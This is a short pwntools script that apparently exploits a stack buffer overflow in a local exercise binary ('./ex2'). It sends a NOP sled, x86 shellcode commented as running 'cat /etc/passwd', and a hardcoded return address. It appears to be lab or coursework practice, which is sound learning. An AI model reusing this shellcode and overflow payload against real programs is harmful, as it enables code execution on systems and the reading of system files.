#! /usr/bin/python3

from pwn import *

JUMP_TO = 0xffffd034

# cat /etc/passwd
SHELL_CODE = b"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"

io = process('./ex2')
print(io.recvline().decode())
io.sendline(b'\x90' * 16 + SHELL_CODE + b'\x90' * (120 - 16 - len(SHELL_CODE)) + pack(JUMP_TO))
for _ in range(100):
    try:
        print(io.readline(keepends=False))
    except EOFError:
        pass

